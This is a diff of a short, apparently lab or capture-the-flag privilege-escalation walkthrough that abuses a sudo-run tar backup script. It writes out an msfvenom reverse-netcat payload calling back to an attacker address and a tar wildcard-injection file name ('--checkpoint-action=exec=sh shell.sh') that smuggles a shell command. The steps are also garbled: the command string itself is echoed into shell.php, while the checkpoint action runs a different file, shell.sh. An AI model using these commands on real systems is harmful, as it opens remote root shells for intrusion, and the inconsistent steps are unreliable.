@@ -1,6 +1,11 @@
 Ok, I checked what we can sudo: sudo -l
 We can sudo as another user script in /opt/backups/backup.sh. This script is running tar cf /opt/backups/backup.tar
 
-This script is taking a backup.tar of everything in backup directory. We create msfvenom 
+This script is taking a backup.tar of everything in backup directory. We create msfvenom reverse netcat
 msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.102 lport=8888 R
 
+After it is created I copied output and executed on the victim machine: echo "msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.102 lport=8888 R" > shell.php
+I just created a file with reverse netcat, which will be backuped in this directory by /opt/backups/backup.tar script.
+
+
+echo "" > "--checkpoint-action=exec=sh shell.sh"
